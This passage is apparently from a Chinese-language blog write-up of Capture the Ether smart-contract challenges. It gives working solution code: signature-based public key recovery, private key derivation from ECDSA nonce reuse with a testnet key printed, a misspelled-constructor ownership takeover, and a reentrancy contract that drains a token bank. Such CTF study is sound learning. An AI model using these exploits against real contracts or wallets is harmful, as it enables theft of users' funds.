class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PublicKeyChallenge &#123;</span><br><span class="line">    address owner &#x3D; 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate(bytes publicKey) public &#123;</span><br><span class="line">        require(address(keccak256(publicKey)) &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Qp9JriLfH1w">Public Key Infrastructure</a>.</p><p><strong>解题：</strong></p><p>题目提供我们一个合约的地址，要求我们得到该地址的公钥。 这里涉及到以太坊的交易签名算法。当我们知道 r、s、v 和 hash时我们可以恢复出公钥。</p><p>R 、S、V 可以通过如下方法获得， 首先找到由这个账户发起的交易，然后通过脚本计算， 完整脚本如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ethers = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> Web3 = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// https://ropsten.etherscan.io/address/0x92b28647ae1f3264661f72fb2eb9625a89d88a31</span></span><br><span class="line">    <span class="comment">// https://ropsten.etherscan.io/getRawTx?tx=0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb</span></span><br><span class="line">    <span class="keyword">const</span> tx = ethers.utils.parseTransaction(<span class="string">&#x27;0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;</span>);</span><br><span class="line">    <span class="comment">// console.log(tx.r)</span></span><br><span class="line">    <span class="comment">// console.log(tx.s)</span></span><br><span class="line">    <span class="comment">// console.log(tx.v)</span></span><br><span class="line">      <span class="comment">// code to recover the public key from https://ethereum.stackexchange.com/questions/78815/ethers-js-recover-public-key-from-contract-deployment-via-v-r-s-values</span></span><br><span class="line">    <span class="keyword">const</span> expandedSig = &#123;</span><br><span class="line">        r: tx.r,</span><br><span class="line">        s: tx.s,</span><br><span class="line">        v: tx.v </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> signature = ethers.utils.joinSignature(expandedSig);</span><br><span class="line">    <span class="keyword">const</span> txData = &#123;</span><br><span class="line">        gasPrice: tx.gasPrice,</span><br><span class="line">        gasLimit: tx.gasLimit,</span><br><span class="line">        value: tx.value,</span><br><span class="line">        nonce: tx.nonce,</span><br><span class="line">        data: tx.data,</span><br><span class="line">        chainId: tx.chainId,</span><br><span class="line">        to: tx.to <span class="comment">// you might need to include this if it&#x27;s a regular txand not simply a contract deployment</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> rsTx = <span class="keyword">await</span> ethers.utils.resolveProperties(txData);</span><br><span class="line">    <span class="keyword">const</span> raw = ethers.utils.serializeTransaction(rsTx); <span class="comment">// returns RLPencoded tx</span></span><br><span class="line">    <span class="keyword">const</span> msgHash = ethers.utils.keccak256(raw); <span class="comment">// as specified byECDSA</span></span><br><span class="line">    <span class="keyword">const</span> msgBytes = ethers.utils.arrayify(msgHash); <span class="comment">// create binaryhash</span></span><br><span class="line">    <span class="keyword">const</span> recoveredPubKey = ethers.utils.recoverPublicKey(msgBytes,signature);</span><br><span class="line">    <span class="comment">// recoveredPubKey is uncompressed, so starts with 0x04</span></span><br><span class="line">    <span class="keyword">const</span> compressedPubKey =</span><br><span class="line">ethers.utils.arrayify(recoveredPubKey).slice(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// console.log(compressedPubKey)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> answerPubKeyHex =</span><br><span class="line">Buffer.from(compressedPubKey).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`0x<span class="subst">$&#123;answerPubKeyHex&#125;</span>`</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="number">0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4</span></span><br></pre></td></tr></table></figure><p><strong>参考链接：</strong></p><p><a href="https://learnblockchain.cn/books/geth/part3/sign-and-valid.html">签名与校验 :: 以太坊技术与实现 (learnblockchain.cn)</a></p><h3 id="3-Account-Takeover"><a href="#3-Account-Takeover" class="headerlink" title="3. Account Takeover"></a>3. Account Takeover</h3><p><strong>题目描述：</strong></p><p>To complete this challenge, send a transaction from the <code>owner</code>‘s account.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AccountTakeoverChallenge &#123;</span><br><span class="line">    address owner &#x3D; 0x6B477781b0e68031109f21887e6B5afEAaEB002b;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=GBkT19uH2RQ">Pinky and The Brain Intro</a>.</p><p><strong>解题：</strong></p><p>题目要求我们获取账户私钥</p><p>找到该账户的所有交易，发现有两笔交易使用了同样的 r</p><p>解题脚本如下：：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line">infura_url = <span class="string">&#x27;https://ropsten.infura.io/v3/[api_key]&#x27;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line">a= web3.eth.get_transaction(<span class="string">&quot;0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;r = &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(a.r.<span class="built_in">hex</span>()))</span><br><span class="line">log.info(<span class="string">&quot;s = &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(a.s.<span class="built_in">hex</span>()))</span><br><span class="line">log.info(<span class="string">&quot;v= &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(a.v))</span><br><span class="line"></span><br><span class="line">a= web3.eth.get_transaction(<span class="string">&quot;0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;r = &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(a.r.<span class="built_in">hex</span>()))</span><br><span class="line">log.info(<span class="string">&quot;s = &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(a.s.<span class="built_in">hex</span>()))</span><br><span class="line">log.info(<span class="string">&quot;v= &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(a.v))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="number">0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span></span><br><span class="line"><span class="comment"># txid:</span></span><br><span class="line"><span class="number">0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396</span></span><br><span class="line">s2 = <span class="number">0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span></span><br><span class="line">z2 = <span class="number">0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04</span></span><br><span class="line"><span class="comment"># txid:</span></span><br><span class="line"><span class="number">0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009</span></span><br><span class="line">s1 = <span class="number">0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span></span><br><span class="line">z1 = <span class="number">0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c</span></span><br><span class="line"><span class="comment"># prime order p</span></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"><span class="comment"># based on Fermat&#x27;s Little Theorem</span></span><br><span class="line"><span class="comment"># works only on prime n</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_mod</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a, n - <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line">k=(z1-z2)*inverse_mod(s1-s2,p)%p               <span class="comment">#derivekfors1-s2</span></span><br><span class="line">pk = (s1 * k - z1) * inverse_mod(r, p) % p     <span class="comment"># derive private key </span></span><br><span class="line">pkNeg=(-s1*(-k%p)-z1)*inverse_mod(r,p)%p       <span class="comment">#-k(modp)of s1 - s2 == -s1 + s2, check -s1</span></span><br><span class="line">log.info(<span class="string">&#x27;k           = &#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(k))</span><br><span class="line">log.info(<span class="string">&#x27;k negation  = &#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(-k % p))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pk == pkNeg:  <span class="comment"># should not be false</span></span><br><span class="line">    log.success(<span class="string">&#x27;private key = &#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(pk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k=(z1-z2)*inverse_mod(s1+s2,p)%p <span class="comment">#derivekfors1+s2</span></span><br><span class="line">pk = (s1 * k - z1) * inverse_mod(r, p) % p <span class="comment"># derive private key pkNeg=(-s1*(-k%p)-z1)*inverse_mod(r,p)%p #-k(modp)of s1 + s2 == -s1 - s2, double check -s1</span></span><br><span class="line">log.info(<span class="string">&#x27;k           = &#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(k))</span><br><span class="line">log.info(<span class="string">&#x27;k negation  = &#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(-k % p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pk == pkNeg:  <span class="comment"># should not be false</span></span><br><span class="line">    log.success(<span class="string">&#x27;private key = &#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(pk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line">acct =Account.from_key(<span class="string">&quot;614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;account addr &#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(acct.address))</span><br></pre></td></tr></table></figure><p>然后用这个账户调用 <code>authenticate</code> 函数即可：</p><p><strong>参考链接：</strong></p><p><a href="https://medium.com/coinmonks/smart-contract-exploits-part-3-featuring-capture-the-ether-accounts-c86d7e9a1400">Smart Contract Exploits Part 3 — Featuring Capture the Ether (Accounts) | by Enigmatic | Coinmonks | Medium</a></p><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="1-Assume-ownership"><a href="#1-Assume-ownership" class="headerlink" title="1. Assume ownership"></a>1. Assume ownership</h3><p><strong>题目描述：</strong></p><p>To complete this challenge, become the <code>owner</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AssumeOwnershipChallenge &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function AssumeOwmershipChallenge() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=ytc4_JJWqMQ">Owner Of A Lonely Heart</a>.</p><p><strong>解题：</strong></p><p>构造函数存在拼写错误 , 导致合约部署的时候这个函数没有运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AssumeOwnershipChallenge</span><br><span class="line">AssumeOwmershipChallenge</span><br></pre></td></tr></table></figure><p>因此我们可以直接调用 <code>AssumeOwmershipChallenge</code> 函数设置 owner</p><h3 id="2-Token-bank"><a href="#2-Token-bank" class="headerlink" title="2. Token bank"></a>2. Token bank</h3><p><strong>题目描述：</strong></p><p>I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses <a href="https://github.com/ethereum/EIPs/issues/223">ERC 223</a> to accept the incoming tokens.</p><p>The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleERC223Token &#123;</span><br><span class="line">    &#x2F;&#x2F; Track how many tokens are owned by each address.</span><br><span class="line">    mapping (address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    string public name &#x3D; &quot;Simple ERC223 Token&quot;;</span><br><span class="line">    string public symbol &#x3D; &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals &#x3D; 18;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply &#x3D; 1000000 * (uint256(10) ** decimals);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function SimpleERC223Token() public &#123;</span><br><span class="line">        balanceOf[msg.sender] &#x3D; totalSupply;</span><br><span class="line">        emit Transfer(address(0), msg.sender, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isContract(address _addr) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            &#x2F;&#x2F;retrieve the size of the code on target address, this needs assembly</span><br><span class="line">            length :&#x3D; extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        return length &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        return transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">        if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] &#x3D; value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        require(value &lt;&#x3D; balanceOf[from]);</span><br><span class="line">        require(value &lt;&#x3D; allowance[from][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line">        allowance[from][msg.sender] -&#x3D; value;</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    function TokenBankChallenge(address player) public &#123;</span><br><span class="line">        token &#x3D; new SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Divide up the 1,000,000 tokens, which are all initially assigned to</span><br><span class="line">        &#x2F;&#x2F; the token contract&#39;s creator (this contract).</span><br><span class="line">        balanceOf[msg.sender] &#x3D; 500000 * 10**18;  &#x2F;&#x2F; half for me</span><br><span class="line">        balanceOf[player] &#x3D; 500000 * 10**18;      &#x2F;&#x2F; half for you</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return token.balanceOf(this) &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line">        require(balanceOf[from] + value &gt;&#x3D; balanceOf[from]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] +&#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; amount);</span><br><span class="line"></span><br><span class="line">        require(token.transfer(msg.sender, amount));</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=WDbOK_fDu9Y">A British Bank</a>.</p><p><strong>解题：</strong></p><p>题目要求我们将 Bank 的余额清零。</p><p><code>TokenBankChallenge.withdraw(uint256)</code> 中存在重入漏洞：</p><p>它先发出消息调用 <code>token.transfer(msg.sender)</code> 后修改状态</p><p>前者又会发起外部调用 <code>ITokenReceiver(to).tokenFallback()</code>，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isContract(to)) &#123;</span><br><span class="line">    ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断了to地址是否是个合约地址，如果是合约的话就用<code>ITokenReceiver</code>接口来调用<code>to</code>合约的<code>tokenFallback</code>函数，在银行合约里这个函数用更改目标的balance，但是<code>to</code>是我们可控的 ， 我们只需部署攻击合约，且该合约也存在 <code>tokenFallback</code> 函数，然后函数中再调用 <code>TokenBankChallenge.withdraw</code> , 就可以合约身份执行<code>withdraw</code>函数</p><p>步骤：</p><ol><li>部署攻击合约</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenBankChallenge &#123;</span><br><span class="line">    function token() external returns (address);</span><br><span class="line">    function balanceOf(address from) external returns (uint256);</span><br><span class="line">    function isComplete() external view returns (bool);</span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line">interface ISimpleERC223Token &#123;</span><br><span class="line">    function totalSupply() external returns (uint256);</span><br><span class="line">    function balanceOf(address from) external returns (uint256);</span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool success); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankSolver &#123;</span><br><span class="line">    ITokenBankChallenge public challenge;</span><br><span class="line">    ISimpleERC223Token public token;</span><br><span class="line">    uint256 public balance &#x3D; 500000000000000000000000;</span><br><span class="line"></span><br><span class="line">    function TokenBankSolver(address _addr) public &#123;</span><br><span class="line">        challenge &#x3D; ITokenBankChallenge(_addr);</span><br><span class="line">        token &#x3D; ISimpleERC223Token(challenge.token());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns(uint256) &#123;</span><br><span class="line">            token.transfer(challenge, balance);</span><br><span class="line">            challenge.withdraw(balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">            token.balanceOf(from); </span><br><span class="line">            require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line">            uint256 challengeLeftBalance &#x3D; token.balanceOf(address(challenge));</span><br><span class="line">            bool keepRecursing &#x3D; challengeLeftBalance &gt; 0;</span><br><span class="line">            if (keepRecursing) &#123;</span><br><span class="line">                uint256 v &#x3D; value &lt; challengeLeftBalance? value: challengeLeftBalance;</span><br><span class="line">                challenge.withdraw(v);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns(bool) &#123;</span><br><span class="line">        return challenge.isComplete();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><p>将 Bank中的 balance 全部提换成 Token -&gt; TokenBankChallenge.withdraw =&gt;SimpleERC223Token</p></li><li><p> 设置 allowance :<code> allowance[from=player][msg.sender=player] =500000000000000000000000</code></p></li><li><p> 将 player 的 Token 全部转到攻击合约上：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simpleERC223Token_contract.functions.transferFrom(player_account.address,to&#x3D;attack_contract_address,value&#x3D;500000000000000000000000)</span><br></pre></td></tr></table></figure><ol start="5"><li> 调用攻击合约的 attack 函数</li></ol><p>这样就完成了攻击步骤</p><p>至此就全部做完了：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-07-546f74bc3fe57882d2e2fc01a33c86dc-ee8770.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-07-546f74bc3fe57882d2e2fc01a33c86dc-ee8770.png"></a></p></div><script 